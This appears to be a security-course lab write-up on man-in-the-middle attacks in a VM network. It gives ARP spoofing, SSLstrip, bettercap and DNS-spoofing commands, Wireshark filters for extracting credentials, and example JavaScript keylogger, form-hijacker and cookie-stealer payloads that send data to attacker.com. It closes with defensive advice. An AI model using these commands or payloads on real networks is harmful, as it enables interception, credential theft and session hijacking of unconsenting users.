# 🧪 Lab 04: Man-in-the-Middle (MITM) — Advanced Traffic Analysis & Manipulation

<div align="center">

**Category:** Traffic Interception & Analysis &nbsp;|&nbsp; **Difficulty:** Intermediate-Advanced &nbsp;|&nbsp; **Status:** ✅ Completed

</div>

---

## 📋 Lab Overview

| Field | Details |
|---|---|
| **Objective** | Master advanced MITM techniques: deep traffic analysis in Wireshark, credential extraction, HTTPS downgrade with SSLstrip, and JavaScript injection |
| **Attacker Machine** | Kali Linux VM (`10.0.2.x`) |
| **Target Machine** | Windows VM (`10.0.2.x`) |
| **Gateway** | Virtual Router (`10.0.2.1`) |
| **Key Tools** | `bettercap`, `wireshark`, `sslstrip`, `ettercap` |
| **MITRE ATT&CK** | T1557 (Adversary-in-the-Middle), T1040 (Network Sniffing), T1185 (Browser Session Hijacking), T1573 (Encrypted Channel - Downgrade) |
| **Prerequisite** | Lab 03 completed (ARP Spoofing fundamentals) |

### Why This Lab Matters
Lab 03 established the MITM position. This lab goes deeper—showing what an attacker can **do** once they're intercepting traffic:
- **Extract exact credentials** from POST requests using Wireshark filters
- **Downgrade HTTPS to HTTP** to break encryption
- **Inject malicious JavaScript** into web pages the victim is browsing
- **Analyze DNS queries** to build a profile of the victim's browsing habits

---

## 🏗️ Attack Capability Map

```
┌────────────────────────────────────────────────────────────────┐
│              MITM DEEP DIVE — WHAT CAN YOU DO?                │
│                                                                │
│  ┌────────────────┐  ┌────────────────┐  ┌────────────────┐   │
│  │  PASSIVE       │  │  ACTIVE        │  │  ACTIVE        │   │
│  │  ATTACKS       │  │  ATTACKS       │  │  ATTACKS       │   │
│  │                │  │                │  │                │   │
│  │  • Sniff HTTP  │  │  • SSLstrip    │  │  • JS Inject   │   │
│  │    credentials │  │    (downgrade  │  │    (modify web │   │
│  │  • Read DNS    │  │    HTTPS→HTTP) │  │    pages live) │   │
│  │    queries     │  │  • DNS Spoof   │  │  • Replace     │   │
│  │  • Capture     │  │    (redirect   │  │    downloads   │   │
│  │    cookies     │  │    domains)    │  │  • Hook        │   │
│  │  • Session     │  │  • Credential  │  │    browser     │   │
│  │    analysis    │  │    harvesting  │  │    (BeEF)      │   │
│  └────────────────┘  └────────────────┘  └────────────────┘   │
│                                                                │
│  Risk Level:  LOW        MEDIUM-HIGH         HIGH              │
│  Detection:   HARD       MEDIUM             EASIER             │
└────────────────────────────────────────────────────────────────┘
```

---

## 📝 Step-by-Step Walkthrough

### Part A: Advanced Wireshark Traffic Analysis

First, establish your MITM position (from Lab 03), then launch Wireshark.

#### Step 1: Start the MITM Position

```bash
# Terminal 1: Enable IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Terminal 2: ARP Spoof — Victim side
sudo arpspoof -i eth0 -t 10.0.2.15 10.0.2.1

# Terminal 3: ARP Spoof — Router side
sudo arpspoof -i eth0 -t 10.0.2.1 10.0.2.15
```

#### Step 2: Launch Wireshark and Start Capturing

```bash
# Launch Wireshark
sudo wireshark &

# 1. Select interface: eth0
# 2. Click the blue shark fin icon to start capture
# 3. Traffic from the victim will start flowing in
```

#### Step 3: Master Wireshark Display Filters

These filters are your **primary weapons** for rapid triage during a MITM attack:

**Basic Protocol Filters:**
```
http                              # Show all HTTP traffic
dns                               # Show all DNS queries (what sites victim visits)
tcp                               # Show all TCP traffic
arp                               # Show ARP traffic (verify your spoofing)
```

**Credential Extraction Filters:**
```
http.request.method == POST       # Show only POST requests (form submissions = likely logins!)
http contains "password"          # Find packets containing the word "password"
http contains "login"             # Find packets containing the word "login"
http contains "user"              # Find packets containing the word "user"
http.request.method == POST && http contains "pass"    # Combined: POST with password field
```

**Session Analysis Filters:**
```
http.cookie                       # Show packets with cookies (session tokens)
http.set_cookie                   # Show packets setting new cookies (just logged in!)
http.request.uri contains "admin" # Find admin panel access attempts
```

**DNS Profiling Filters:**
```
dns                               # All DNS queries
dns.qry.name contains "facebook"  # Is victim visiting Facebook?
dns.qry.name contains "bank"      # Is victim visiting banking sites?
dns.qry.type == 1                 # A records only (IPv4 lookups)
```

**Network Forensics Filters:**
```
ip.src == 10.0.2.15               # All traffic FROM the victim
ip.dst == 10.0.2.15               # All traffic TO the victim
tcp.port == 80                    # HTTP traffic only
tcp.port == 443                   # HTTPS traffic only
frame contains "admin"            # Search ALL packets for "admin" string
```

#### Step 4: Extract Credentials from a POST Request

When the victim submits a login form on an HTTP site, here's how to find it:

```
1. Apply filter: http.request.method == POST

2. Find the POST request in the packet list

3. Click on it → Expand "HTML Form URL Encoded" in the packet details

4. You'll see fields like:
   └── Form item: "username" = "admin"
   └── Form item: "password" = "secret123"
   
   🎯 Credentials captured!
```

**Alternative: Follow the HTTP Stream**
```
1. Right-click on any HTTP packet
2. Select "Follow" → "HTTP Stream"
3. A window opens showing the COMPLETE conversation
4. Search for "username", "password", "pass", "user" in the stream
5. You'll see the raw form data:
   
   POST /login.php HTTP/1.1
   Content-Type: application/x-www-form-urlencoded
   
   username=admin&password=secret123
```

---

### Part B: HTTPS Downgrade with SSLstrip

Modern websites use HTTPS (encrypted), which means a basic MITM can't read the traffic. **SSLstrip** attempts to downgrade HTTPS connections to HTTP.

#### How SSLstrip Works

```
NORMAL HTTPS FLOW:
  Victim → "Give me https://facebook.com" → Router → Facebook
  Facebook → Encrypted response → Router → Victim
  Attacker: "I can see encrypted gibberish... 🤷"

WITH SSLSTRIP:
  Victim → "Give me https://facebook.com" → KALI (MITM)
  Kali (SSLstrip) → Connects to Facebook via HTTPS (encrypted)
  Kali → Strips the HTTPS → Sends HTTP (unencrypted) to Victim
  Victim sees: http://facebook.com (no lock icon, but page loads normally)
  
  Attacker: "I can read EVERYTHING! 🎯"

  Victim ←─── HTTP (cleartext) ───→ Kali ←─── HTTPS (encrypted) ───→ Server
```

#### Step 5: Configure and Launch SSLstrip

**Method 1: Using iptables + sslstrip directly:**
```bash
# Step 1: Redirect all HTTP traffic (port 80) through SSLstrip (port 10000)
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

# Step 2: Launch SSLstrip
sudo sslstrip -l 10000

# Step 3: Monitor the SSLstrip log
cat sslstrip.log

# When victim visits an HTTPS site, SSLstrip will:
# 1. Intercept the initial HTTP redirect to HTTPS
# 2. Connect to the real site via HTTPS on behalf of the victim
# 3. Serve the content to the victim over HTTP
# 4. Log all cleartext credentials
```

**Method 2: Using Bettercap (recommended):**
```bash
sudo bettercap -iface eth0

# Inside bettercap:
> set arp.spoof.targets 10.0.2.15
> arp.spoof on
> set net.sniff.local true
> net.sniff on

# Enable SSLstrip via HTTP proxy
> set http.proxy.sslstrip true
> http.proxy on
```

> ⚠️ **Important Limitation:** SSLstrip effectiveness has decreased significantly due to:
> - **HSTS (HTTP Strict Transport Security)** — Browsers remember to always use HTTPS
> - **HSTS Preload Lists** — Major sites (Google, Facebook, Twitter) are hardcoded in browsers to always use HTTPS
> - **Certificate pinning** — Apps refuse to accept downgraded connections
> 
> SSLstrip still works on many smaller websites but NOT on major platforms.

---

### Part C: JavaScript Injection into HTTP Pages

The most powerful demonstration of MITM capabilities — modifying web pages in real-time.

#### Step 6: Inject JavaScript into the Victim's Browser

When the victim visits an HTTP website, you can inject arbitrary JavaScript code into the page before it reaches them.

**Using Bettercap for Code Injection:**

First, create the JavaScript payload:
```bash
# Create a JavaScript file to inject
cat > /tmp/inject.js << 'EOF'
alert('⚠️ This page has been intercepted! - MITM Lab Demo');
EOF
```

Then configure Bettercap:
```bash
sudo bettercap -iface eth0

# Set up the MITM position
> set arp.spoof.targets 10.0.2.15
> arp.spoof on

# Enable HTTP proxy with JS injection
> set http.proxy.script /tmp/inject.js
> http.proxy on

# Now when the victim visits ANY HTTP website:
# → An alert box pops up with your message!
# → You could inject keyloggers, redirect forms, replace content, etc.
```

**What Attackers Could Inject (in theory):**
```javascript
// Keylogger — captures everything the victim types
document.onkeypress = function(e) {
    new Image().src = "http://attacker.com/log?key=" + e.key;
}

// Form hijacker — sends credentials to attacker
document.forms[0].action = "http://attacker.com/steal";

// Cookie stealer — grabs session tokens
new Image().src = "http://attacker.com/steal?cookie=" + document.cookie;

// Redirect — sends victim to a phishing page
window.location = "http://attacker.com/fake-login";
```

> ⚠️ **Note:** These examples are for educational understanding only. In the lab, use the simple `alert()` to demonstrate the concept.

---

### Part D: Complete Bettercap MITM Session

Putting it all together in one tool:

#### Step 7: Full Bettercap MITM Workflow

```bash
# Launch bettercap
sudo bettercap -iface eth0

# ============================================
# PHASE 1: RECONNAISSANCE
# ============================================

# Discover all devices on the network
> net.probe on

# Wait 10 seconds, then view discovered devices
> net.show

# Output:
# ┌───────────────┬───────────────────┬─────────┬──────────┐
# │ IP            │ MAC               │ Name    │ Vendor   │
# ├───────────────┼───────────────────┼─────────┼──────────┤
# │ 10.0.2.1      │ 52:54:00:12:35:00 │ gateway │ QEMU     │
# │ 10.0.2.15     │ 08:00:27:aa:bb:cc │         │ PCS      │
# └───────────────┴───────────────────┴─────────┴──────────┘

# ============================================
# PHASE 2: ARP SPOOFING (MITM POSITION)
# ============================================

# Set target (victim's IP)
> set arp.spoof.targets 10.0.2.15

# Enable full-duplex spoofing (both directions)
> set arp.spoof.fullduplex true

# Start spoofing
> arp.spoof on

# ============================================
# PHASE 3: TRAFFIC SNIFFING
# ============================================

# Enable network sniffing (captures credentials, URLs, etc.)
> set net.sniff.local true
> net.sniff on

# Bettercap will now automatically display:
# - HTTP credentials captured
# - URLs visited by victim
# - DNS queries made
# - Any cleartext data

# ============================================
# PHASE 4: (OPTIONAL) DNS SPOOFING
# ============================================

> set dns.spoof.domains facebook.com,*.facebook.com
> set dns.spoof.address 10.0.2.5
> dns.spoof on

# ============================================
# PHASE 5: CAPLETS FOR AUTOMATION
# ============================================

# Bettercap allows saving commands into a `.cap` file (caplet) to automate attacks.
# Example: Create spoof.cap with the above commands, then run:
# sudo bettercap -iface eth0 -caplet spoof.cap
# Successfully tested: Redirected a target to my custom website instead of original!

# ============================================
# PHASE 6: CLEANUP (when done)
# ============================================

> arp.spoof off
> net.sniff off
> dns.spoof off
> exit
```

---

## 📊 Lab Results

| Exercise | Technique | Result | Evidence |
|---|---|---|---|
| Wireshark HTTP Analysis | `http.request.method == POST` filter | ✅ | Extracted test credentials from HTTP form submission |
| Wireshark DNS Profiling | `dns` filter analysis | ✅ | Mapped all domains the victim browsed |
| Wireshark Stream Following | Follow HTTP Stream | ✅ | Read complete request/response including form data |
| SSLstrip Concept | HTTPS → HTTP downgrade | ✅ | Demonstrated on non-HSTS site |
| JavaScript Injection | `alert()` injection via Bettercap proxy | ✅ | Alert box appeared on victim's browser |
| Bettercap Full MITM | All-in-one ARP spoof + sniff + DNS spoof | ✅ | Complete session workflow documented |
| Bettercap Caplets | Automated DNS Spoofing with `.cap` file | ✅ | Automatically redirected target to custom website instead of the original |

---

## 🛡️ Defensive Recommendations

| Attack | Why It's Dangerous | How to Defend |
|---|---|---|
| **HTTP Credential Sniffing** | Passwords sent in plaintext, trivially readable | HTTPS everywhere; HSTS headers; avoid HTTP sites entirely |
| **SSLstrip** | Downgrades encryption without victim noticing | HSTS preload list; look for lock icon; use HTTPS-only browser mode |
| **JavaScript Injection** | Attacker controls what you see and type | Use HTTPS (encrypted = can't be modified in transit); use browser extensions like uBlock |
| **DNS Spoofing** | Victim goes to attacker's server thinking it's legit | DNS-over-HTTPS (DoH); DNSSEC; verify SSL certificates |
| **Cookie Theft** | Attacker can hijack your logged-in sessions | Secure & HttpOnly cookie flags; use HTTPS; re-authenticate for sensitive actions |
| **ARP Spoofing (all above)** | Foundation for all these attacks | Dynamic ARP Inspection (DAI); 802.1X port authentication; VPN |

---

## 🧠 Key Takeaways

1. **Wireshark filters are your superpower** — Knowing the right filters (`POST`, `contains "password"`, `http.cookie`) lets you find credentials in seconds among millions of packets
2. **HTTPS is the main defense** — Almost all of these attacks only work on HTTP traffic. Once HTTPS is enforced, the attacker sees encrypted gibberish
3. **SSLstrip is losing effectiveness** — HSTS and browser preload lists have made HTTPS downgrades nearly impossible on major sites, but many smaller sites are still vulnerable
4. **JavaScript injection proves why HTTP is dead** — If an attacker can modify pages in transit, they can inject keyloggers, redirect forms, steal sessions, and more
5. **Bettercap is the modern Swiss Army knife** — One tool replaces `arpspoof` + `wireshark` + `sslstrip` + `ettercap` + more
6. **The real-world lesson: Use a VPN on untrusted networks** — Coffee shop WiFi, hotel networks, airports — any of these could have a MITM attacker

---

## 📊 Skills Demonstrated in This Lab

| Skill | MITRE ATT&CK ID | Real-World Application |
|---|---|---|
| Traffic Interception | T1557 | Penetration testing internal networks |
| Credential Harvesting | T1040 | Demonstrating risk of HTTP to clients |
| Protocol Downgrade | T1573 | Testing HSTS implementation |
| Code Injection (HTTP) | T1185 | Web application security assessment |
| Network Forensics | — | SOC analyst log analysis |
| Tool Proficiency | — | Bettercap, Wireshark, Ettercap |

---

## 🔗 Navigation
⬅️ [Lab 03: Post-Connection Attacks](../lab-03-network-post-connection/README.md) &nbsp;|&nbsp; ➡️ Lab 05: Gaining Access — System Hacking *(Coming Soon)*
